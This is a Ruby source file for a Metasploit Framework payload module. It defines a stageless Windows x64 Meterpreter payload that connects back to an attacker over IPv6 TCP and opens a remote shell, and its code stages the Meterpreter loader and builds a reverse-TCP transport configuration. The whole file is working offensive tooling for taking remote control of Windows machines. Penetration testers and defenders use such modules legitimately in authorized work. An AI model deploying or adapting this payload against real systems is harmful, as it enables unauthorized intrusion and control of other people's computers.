##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/transport_config'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/x64/meterpreter_loader'
require 'msf/base/sessions/meterpreter_x64_win'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module MetasploitModule

  CachedSize = 206403

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::MeterpreterLoader_x64
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Meterpreter_x64_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
      OptString.new('EXTINIT',    [false, 'Initialization strings for extensions']),
      OptInt.new("SCOPEID", [false, "The IPv6 Scope ID, required for link-layer addresses", 0])
    ])
  end

  def generate(opts={})
    opts[:stageless] = true
    stage_meterpreter(opts) + generate_config(opts)
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block
    config_opts = {
      arch:       opts[:uuid].arch,
      exitfunk:   datastore['EXITFUNC'],
      expiration: datastore['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: [transport_config_reverse_ipv6_tcp(opts)],
      extensions: (datastore['EXTENSIONS'] || '').split(','),
      ext_init:   (datastore['EXTINIT'] || ''),
      stageless:  true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end
end


